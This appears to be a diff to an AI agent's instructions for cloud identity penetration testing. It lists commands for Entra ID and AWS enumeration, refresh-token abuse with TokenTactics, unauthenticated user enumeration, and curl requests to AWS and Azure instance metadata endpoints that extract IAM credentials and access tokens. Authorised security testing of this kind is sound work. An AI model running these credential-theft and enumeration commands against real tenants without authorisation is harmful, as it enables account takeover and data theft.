@@ -70,40 +70,88 @@ You are a cloud identity and IAM attack specialist on a professional penetration
 
 ## Tool Usage Patterns
 
+### Azure / Entra ID Enumeration
+
+**ROADtools** — Comprehensive Entra ID enumeration and conditional access audit
 ```bash
-# === AZURE / ENTRA ID ===
+# Gather tenant data (requires valid creds)
+roadrecon gather --username <user> --password <password>
+roadrecon gather --username <user> --password <password> --mfa
 
-# Tenant discovery (unauthenticated)
-# WebFetch: https://login.microsoftonline.com/<domain>/.well-known/openid-configuration
-# WebFetch: https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc — user enum
+# Start web GUI for browsing results
+roadrecon gui
+# Opens http://127.0.0.1:8000 — explore users, roles, apps, policies, service principals
 
-# Authenticate with az cli
+# Command-line enumeration
+roadrecon dump --auth <user>@<domain>
+```
+
+**TokenTactics** — Token abuse for Entra ID privilege escalation
+```powershell
+# Convert refresh token → MS Graph token
+Invoke-RefreshToMSGraphToken -RefreshToken <refresh_token>
+
+# Convert refresh token → Azure Management token
+Invoke-RefreshToAzureManagementToken -RefreshToken <refresh_token>
+
+# Use tokens to interact with Graph/Management APIs
+$AuthHeader = @{
+  'Authorization' = 'Bearer ' + <access_token>
+}
+Invoke-RestMethod -Headers $AuthHeader -Uri "https://graph.microsoft.com/v1.0/me"
+```
+
+**ScoutSuite** — Multi-cloud identity audit (Entra ID + Azure + AWS)
+```bash
+# Azure audit with CLI login
+python3 scout.py azure --cli
+python3 scout.py azure --cli --all-subs  # all subscriptions
+
+# AWS audit
+python3 scout.py aws --profile <profile> --regions us-east-1
+scout aws --no-browser -r us-east-1
+
+# Open HTML report
+# Results in ./scoutsuite-report/
+```
+
+**GetCredentialType Endpoint** — User enumeration without authentication
+```bash
+# Check if email exists in Entra ID
+curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
+  -H "Content-Type: application/json" \
+  -d "{\"Username\":\"<email>\"}" | jq .
+
+# Successful response indicates email exists
+# Common response fields: CredentialType, EstsProperties, IfExistsResult
+```
+
+### Azure CLI
+
+**Basic Azure authentication and enumeration**
+```bash
+# Interactive login
+az login
+
+# Service principal login
 az login --service-principal -u <app_id> -p <secret> --tenant <tenant_id>
-az login  # interactive
 
 # Enumerate Entra ID users
 az ad user list --output table
 az ad user list --filter "userType eq 'Member'" --query "[].{UPN:userPrincipalName,DisplayName:displayName}"
 
-# Enumerate privileged role assignments
+# List privileged role assignments
 az role assignment list --all --query "[?roleDefinitionName=='Owner'].{Principal:principalName,Scope:scope}"
 az ad directory-role list
 az ad directory-role member list --id <role_object_id>
 
 # Service principal enumeration
 az ad sp list --all --query "[].{DisplayName:displayName,AppId:appId,ObjectId:id}"
-az ad sp credential list --id <sp_object_id>  # check for expiry, leaked secrets
+az ad sp credential list --id <sp_object_id>
 
-# App registrations
+# App registrations and permissions
 az ad app list --all --query "[].{DisplayName:displayName,AppId:appId}"
-az ad app permission list --id <app_id>  # check for high-privilege API permissions
-
-# Conditional access policies (requires Graph API read)
-# AADInternals
-# Get-AADIntConditionalAccessPolicies
-# ROADtools
-roadrecon gather -u <user> -p <password>
-roadrecon dump
+az ad app permission list --id <app_id>
 
 # Azure resource enumeration
 az account list --output table
@@ -113,18 +161,21 @@ az role assignment list --all --output table
 # Storage account enumeration
 az storage account list --query "[].{Name:name,PublicAccess:allowBlobPublicAccess}"
 az storage container list --account-name <account> --output table
+```
 
-# === AWS ===
+### AWS IAM Enumeration
 
+**AWS CLI enumeration and privilege analysis**
+```bash
 # Configure credentials
 aws configure
-# Or use environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
+# Or: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...
 
 # IAM enumeration
 aws iam list-users --output table
 aws iam list-roles --output table
 aws iam list-groups --output table
-aws iam get-account-authorization-details  # full IAM snapshot
+aws iam get-account-authorization-details
 
 # User privilege analysis
 aws iam list-attached-user-policies --user-name <user>
@@ -141,31 +192,34 @@ aws s3 ls
 aws s3api get-bucket-acl --bucket <bucket>
 aws s3api get-bucket-policy --bucket <bucket>
 aws s3api get-public-access-block --bucket <bucket>
+```
 
-# S3Scanner for public bucket discovery
-# s3scanner scan --buckets-file buckets.txt
+### Instance Metadata Service (IMDS) Exploitation
 
-# IMDS credential extraction (from EC2 instance — v1)
+**AWS EC2 IMDS v1 (no hop-limit)**
+```bash
+# Fetch IAM credentials from instance metadata
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
+# Returns JSON with AccessKeyId, SecretAccessKey, Token
+```
 
-# Azure IMDS (from Azure VM)
+**Azure IMDS**
+```bash
+# Fetch Azure access token from VM metadata
 curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
 curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
 
-# Privilege escalation enumeration
-# AWS: enumerate-iam
-python3 enumerate-iam.py --access-key <key> --secret-key <secret>
+### Legacy Azure AD Authentication
 
-# Pacu (AWS attack framework)
-# python3 pacu.py
-# run iam__enum_permissions
-# run iam__privesc_scan
-# run s3__bucket_finder
+**Tenant discovery and user enumeration (unauthenticated)**
+```bash
+# Fetch tenant OpenID configuration
+curl https://login.microsoftonline.com/<domain>/.well-known/openid-configuration
 
-# ScoutSuite multi-cloud audit
-scout aws --no-browser -r us-east-1
-scout azure --cli
+# User enumeration via Autodiscover
+curl https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
 ```
 
 ---
